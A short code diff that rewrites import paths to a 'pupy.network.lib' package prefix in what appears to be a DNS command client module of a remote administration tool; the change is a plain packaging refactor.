@@ -35,7 +35,7 @@ except ImportError:
     logging.info('dnslib not available')
     dnslib = None
 
-from network.lib.transports.cryptoutils import ECPV, get_random
+from pupy.network.lib.transports.cryptoutils import ECPV, get_random
 
 from .picocmd import (
     Poll, Ack,
@@ -57,10 +57,10 @@ from .picocmd import (
 
 CLIENT_VERSION = 2
 
-from network.lib import tinyhttp
-from network.lib import online
-from network.lib import doh as securedns
-from network.lib import Proxy
+from pupy.network.lib import tinyhttp
+from pupy.network.lib import online
+from pupy.network.lib import doh as securedns
+from pupy.network.lib import Proxy
 
 
 class DnsCommandsClient(Thread):
